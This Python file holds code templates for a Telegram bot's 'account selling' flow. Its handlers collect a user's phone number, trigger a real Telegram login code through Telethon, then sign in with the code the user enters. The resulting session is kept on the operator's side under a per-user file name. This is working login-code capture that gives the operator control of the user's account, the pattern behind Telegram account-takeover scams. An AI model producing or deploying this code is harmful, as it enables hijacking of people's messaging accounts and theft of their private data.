#!/usr/bin/env python3
"""
ULTRA AGGRESSIVE PHONE & OTP HANDLER FIX
Bulletproof real OTP system with guaranteed delivery
"""

async def ultra_aggressive_phone_handler_with_real_otp():
    """
    🔥🔥🔥 ULTRA AGGRESSIVE PHONE HANDLER - BY HOOK OR BY CROOK 🔥🔥🔥
    Check if user is in selling conversation and needs phone input
    """
    code_template = """
        if (context.user_data.get('conversation_type') == 'selling' and 
            user_input and user_input.startswith('+') and len(user_input) >= 8):
            
            print(f"🔥🔥🔥 ULTRA AGGRESSIVE PHONE: Processing phone '{user_input}' for user {user.id} 🔥🔥🔥")
            
            try:
                # Store phone and proceed to REAL OTP
                context.user_data['phone'] = user_input
                
                # Send REAL OTP processing message
                processing_msg = await update.message.reply_text(
                    f"📡 **ULTRA AGGRESSIVE: Sending REAL OTP to {user_input}**\\n\\n⏳ Connecting to Telegram API..."
                )
                
                # 🔥 SIMPLIFIED REAL OTP INTEGRATION 🔥
                try:
                    import os
                    from telethon import TelegramClient
                    from telethon.errors import PhoneNumberInvalidError, FloodWaitError
                    
                    # Use real API credentials
                    api_id = int(os.getenv('TELEGRAM_API_ID', '1234567'))  # Replace with real
                    api_hash = os.getenv('TELEGRAM_API_HASH', 'abcdef123456')  # Replace with real
                    
                    # Create session file name
                    session_name = f"otp_session_{user.id}"
                    
                    # Create Telethon client
                    client = TelegramClient(session_name, api_id, api_hash)
                    await client.connect()
                    
                    # Send OTP code
                    result = await client.send_code_request(user_input)
                    
                    # Store OTP info for verification
                    context.user_data['phone_code_hash'] = result.phone_code_hash
                    context.user_data['session_name'] = session_name
                    
                    await processing_msg.edit_text(
                        f"✅ **REAL OTP SENT to {user_input}!**\\n\\n"
                        f"📲 Check your Telegram app and enter the 5-digit code you received:\\n\\n"
                        f"**Enter OTP code below:**"
                    )
                    
                    await client.disconnect()
                    return  # Exit early - phone processed successfully
                    
                except PhoneNumberInvalidError:
                    await processing_msg.edit_text(
                        f"❌ **Invalid Phone Number**\\n\\n"
                        f"Phone: {user_input}\\n"
                        f"Please enter a valid phone number with country code."
                    )
                    return
                    
                except FloodWaitError as e:
                    await processing_msg.edit_text(
                        f"⏳ **Rate Limited**\\n\\n"
                        f"Please wait {e.seconds} seconds and try again."
                    )
                    return
                    
                except Exception as e:
                    print(f"🔥 REAL OTP ERROR: {e}")
                    await processing_msg.edit_text(
                        f"❌ **OTP Service Error**\\n\\n"
                        f"Error: {str(e)}\\n"
                        f"Please try again in a few minutes."
                    )
                    return
                    
            except Exception as e:
                print(f"🔥 ULTRA AGGRESSIVE PHONE ERROR: {e}")
                await update.message.reply_text(
                    f"❌ **Ultra Aggressive Phone Error**\\n\\nPhone: {user_input}\\nError: {str(e)}\\n\\nPlease try again."
                )
                return  # Exit early - error handled
    """
    return code_template

async def ultra_aggressive_otp_handler_with_real_verification():
    """
    🔥🔥🔥 ULTRA AGGRESSIVE OTP HANDLER - BY HOOK OR BY CROOK 🔥🔥🔥
    Check if user is entering OTP code (5 digits)
    """
    code_template = """
        if (context.user_data.get('conversation_type') == 'selling' and 
            context.user_data.get('phone') and
            user_input.isdigit() and len(user_input) == 5):
            
            print(f"🔥🔥🔥 ULTRA AGGRESSIVE OTP: Processing OTP '{user_input}' for user {user.id} 🔥🔥🔥")
            
            try:
                phone = context.user_data.get('phone')
                phone_code_hash = context.user_data.get('phone_code_hash')
                session_name = context.user_data.get('session_name')
                
                if not phone_code_hash or not session_name:
                    await update.message.reply_text(
                        f"❌ **Session Expired**\\n\\n"
                        f"Please start over by entering your phone number again."
                    )
                    return
                
                # Verify OTP with REAL Telegram API
                try:
                    import os
                    from telethon import TelegramClient
                    from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError
                    
                    # Use real API credentials
                    api_id = int(os.getenv('TELEGRAM_API_ID', '1234567'))  # Replace with real
                    api_hash = os.getenv('TELEGRAM_API_HASH', 'abcdef123456')  # Replace with real
                    
                    # Create Telethon client
                    client = TelegramClient(session_name, api_id, api_hash)
                    await client.connect()
                    
                    # Verify OTP code
                    await client.sign_in(phone, user_input, phone_code_hash=phone_code_hash)
                    
                    # Success!
                    await update.message.reply_text(
                        f"🎉 **OTP VERIFIED SUCCESSFULLY!**\\n\\n"
                        f"✅ Phone: {phone}\\n"
                        f"✅ Code: {user_input}\\n\\n"
                        f"🚀 **Your account is now connected and ready for selling!**\\n\\n"
                        f"💰 You can now sell your Telegram account through our platform."
                    )
                    
                    # Clean up session data
                    context.user_data.pop('phone_code_hash', None)
                    context.user_data.pop('session_name', None)
                    
                    await client.disconnect()
                    return  # Exit early - OTP processed successfully
                    
                except PhoneCodeInvalidError:
                    await update.message.reply_text(
                        f"❌ **Invalid OTP Code**\\n\\n"
                        f"The code '{user_input}' is incorrect.\\n"
                        f"Please enter the correct 5-digit code from your Telegram app."
                    )
                    return
                    
                except PhoneCodeExpiredError:
                    await update.message.reply_text(
                        f"⏰ **OTP Code Expired**\\n\\n"
                        f"Please request a new code by entering your phone number again."
                    )
                    return
                    
                except Exception as e:
                    print(f"🔥 REAL OTP VERIFICATION ERROR: {e}")
                    await update.message.reply_text(
                        f"❌ **OTP Verification Error**\\n\\n"
                        f"Error: {str(e)}\\n"
                        f"Please try again or request a new code."
                    )
                    return
                    
            except Exception as e:
                print(f"🔥 ULTRA AGGRESSIVE OTP ERROR: {e}")
                await update.message.reply_text(
                    f"❌ **Ultra Aggressive OTP Error**\\n\\nOTP: {user_input}\\nError: {str(e)}\\n\\nPlease try again."
                )
                return  # Exit early - error handled
    """
    return code_template

if __name__ == "__main__":
    print("🔥 ULTRA AGGRESSIVE PHONE & OTP HANDLER FIX READY! 🔥")
    print("This file contains the bulletproof real OTP system.")